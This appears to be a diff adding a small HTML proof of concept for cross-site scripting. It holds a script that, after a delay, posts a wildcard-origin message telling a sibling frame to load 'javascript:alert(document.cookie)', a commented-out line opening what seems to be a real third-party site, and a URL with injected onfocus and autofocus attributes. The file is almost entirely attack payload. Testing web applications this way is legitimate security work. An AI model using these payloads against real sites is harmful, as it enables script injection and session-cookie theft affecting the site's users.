@@ -1,0 +1,12 @@
+<!-- <iframe src="./test2.html"></iframe> -->
+<script>
+// childwin = window.open("http://jflove.10010.com/projects?projectName=%E7%A7%AF%E5%88%86");
+
+function sendMessage(){
+	// console.log(document.getElementsByTagName("iframe"));
+	window.parent.frames[1].postMessage({"command":"pageReload","href":"javascript:alert(document.cookie)"},'*');
+	alert('发送成功');
+}
+(function(){setTimeout("sendMessage()", 5000);}());
+</script>
+<!-- <https://site.com/x?v1/onfocus='alert(222).jpg'&v1/autofocus='1.jpg'&v1/tabindex='1.jpg'> -->
